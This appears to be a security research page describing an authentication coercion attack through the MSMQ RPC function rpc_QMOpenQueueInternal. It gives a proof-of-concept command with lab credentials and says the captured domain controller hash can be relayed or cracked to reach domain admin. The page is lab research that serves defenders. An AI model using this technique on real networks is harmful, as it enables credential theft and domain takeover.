# MS-MQMP - Remote call to rpc_QMOpenQueueInternal (opnum 19)

## Summary

+ **Protocol**: [[MS-MQMP]: Message Queuing (MSMQ): Queue Manager Client Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mqmp/8e379aa2-802d-4fcc-b6a6-6203e4606fa9)

+ **Protocol UUID**: fdb3a030-065f-11d1-bb9b-00a024ea5525

+ **Protocol version**: 1.0

+ **SMB Named pipe**: ``

+ **Function name**: [`rpc_QMOpenQueueInternal`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mqmp/de086803-3f83-44ec-9bd3-417216c171c8)

+ **Function operation number**: `19`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MS-MQMP`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mqmp/8e379aa2-802d-4fcc-b6a6-6203e4606fa9) protocol (with uuid `fdb3a030-065f-11d1-bb9b-00a024ea5525` and version `1.0`) in order to perform remote procedure calls to functions in the [`MS-MQMP`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mqmp/8e379aa2-802d-4fcc-b6a6-6203e4606fa9) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MS-MQMP]: Message Queuing (MSMQ): Queue Manager Client Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mqmp/8e379aa2-802d-4fcc-b6a6-6203e4606fa9) and allows to call RPC functions of this protocol. We will then call the remote [`rpc_QMOpenQueueInternal`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mqmp/de086803-3f83-44ec-9bd3-417216c171c8) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
rpc_QMOpenQueueInternal('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
HRESULT rpc_QMOpenQueueInternal(
   [in] handle_t hBind,
   [in] QUEUE_FORMAT* pQueueFormat,
   [in] DWORD dwDesiredAccess,
   [in] DWORD dwShareMode,
   [in] DWORD hRemoteQueue,
   [in, out, ptr, string] WCHAR** lplpRemoteQueueName,
   [in] DWORD* dwpQueue,
   [in] GUID* pLicGuid,
   [in, string] WCHAR* lpClientName,
   [out] DWORD* pdwQMContext,
   [out] RPC_QUEUE_HANDLE* phQueue,
   [in] DWORD dwRemoteProtocol,
   [in] DWORD dwpRemoteContext
 );
```

## References

+ Documentation of protocol [MS-MQMP]: Message Queuing (MSMQ): Queue Manager Client Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mqmp/8e379aa2-802d-4fcc-b6a6-6203e4606fa9

+ Documentation of function `rpc_QMOpenQueueInternal`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mqmp/de086803-3f83-44ec-9bd3-417216c171c8